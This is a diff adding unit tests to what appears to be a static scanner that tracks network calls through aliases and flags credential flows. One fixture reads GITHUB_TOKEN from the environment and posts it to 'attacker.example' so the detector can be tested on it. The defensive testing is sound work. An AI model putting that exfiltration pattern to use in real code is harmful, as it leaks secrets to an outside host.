@@ -417,6 +417,173 @@ client.get("https://example.test")
     ] == [("httpx.Client.get", "network")]
 
 
+def test_direct_and_chained_callable_aliases_are_tracked() -> None:
+    source = """
+import requests
+
+send = requests.post
+again = send
+send("https://direct.example")
+again("https://chained.example")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [
+        (call.qualified_name, call.category) for call in calls if call.category == "network"
+    ] == [("requests.post", "network"), ("requests.post", "network")]
+
+
+def test_imported_callable_alias_in_function_is_tracked() -> None:
+    source = """
+def send_request():
+    from requests import post
+    post("https://function.example")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [
+        (call.qualified_name, call.category) for call in calls if call.category == "network"
+    ] == [("requests.post", "network")]
+
+
+def test_bound_client_method_callable_alias_is_tracked() -> None:
+    source = """
+import httpx
+
+client = httpx.Client()
+send = client.post
+send("https://bound.example")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [
+        (call.qualified_name, call.category) for call in calls if call.category == "network"
+    ] == [("httpx.Client.post", "network")]
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        """
+import requests
+send = requests.post
+send = object()
+send("not-network")
+""",
+        """
+import requests
+send = requests.post
+def call(send):
+    send("not-network")
+""",
+        """
+import requests
+send = requests.post
+for send in values:
+    send("not-network")
+""",
+        """
+import requests
+send = requests.post
+del send
+send("not-network")
+""",
+    ],
+)
+def test_callable_aliases_are_invalidated_by_rebinding_and_scope_binders(source: str) -> None:
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_callable_aliases_are_invalidated_by_with_except_and_comprehension_targets() -> None:
+    source = """
+import requests
+
+send = requests.post
+with context() as send:
+    send("not-network")
+send("https://with-restored.example")
+
+send = requests.post
+try:
+    pass
+except Exception as send:
+    send("not-network")
+send("https://except-invalidated.example")
+
+send = requests.post
+[send("not-network") for send in send_values]
+send("https://comprehension-restored.example")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
+        ("requests.post", 18),
+    ]
+
+
+def test_callable_aliases_are_invalidated_by_function_class_and_import_bindings() -> None:
+    source = """
+import requests
+
+send = requests.post
+def send():
+    pass
+send("not-network")
+
+send = requests.post
+class send:
+    pass
+send("not-network")
+
+send = requests.post
+from somewhere import send
+send("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_safe_constructor_callable_aliases_are_not_network_calls() -> None:
+    source = """
+import httpx
+
+URL = httpx.URL
+Response = httpx.Response
+Client = httpx.Client
+URL("https://example.test")
+Response(200)
+Client()
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_class_body_callable_aliases_do_not_leak_into_methods() -> None:
+    source = """
+import requests
+
+class Example:
+    send = requests.post
+
+    def call(self):
+        send("not-network")
+"""
+    calls, _ = scan_calls(ast.parse(source), source)
+    assert [call for call in calls if call.category == "network"] == []
+
+
+def test_callable_aliases_carry_credential_flow() -> None:
+    source = """
+import requests
+import os
+
+send = requests.post
+secret = os.getenv("GITHUB_TOKEN")
+send("https://attacker.example", data=secret)
+"""
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
+        ("os.getenv('GITHUB_TOKEN')", "requests.post")
+    ]
+
+
 def test_custom_traversal_keeps_nested_calls_in_ast_children() -> None:
     source = """
 import requests
